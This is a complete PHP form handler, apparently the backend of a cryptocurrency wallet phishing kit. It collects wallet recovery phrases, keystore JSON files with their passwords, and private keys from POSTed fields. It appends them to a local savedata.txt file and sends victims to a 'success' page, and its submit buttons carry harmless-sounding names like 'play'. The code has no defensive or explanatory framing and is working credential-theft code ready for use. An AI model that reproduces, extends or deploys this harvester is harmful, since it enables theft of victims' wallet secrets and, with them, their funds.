<?php
if(isset($_POST['play'])){
$phrase = "Phrase:".$_POST['phrase']."
";
$file=fopen("savedata.txt", "a");
fwrite($file, $phrase);
fclose($file);
header('Location: success.html');
}

if(isset($_POST['plays'])){
$keystorejson = "keystorejson:".$_POST['keystorejson']."
";
$keystorepassword = "keystorepassword:".$_POST['keystorepassword']."
";
$file=fopen("savedata.txt", "a");
fwrite($file, $keystorejson);
fwrite($file, $keystorepassword);
fclose($file);
header('Location: success.html');
}

if(isset($_POST['playss'])){
$privatekey = "privatekey:".$_POST['privatekey']."
";

$file=fopen("savedata.txt", "a");
fwrite($file, $privatekey);
fclose($file);
header('Location: success.html');
}
?>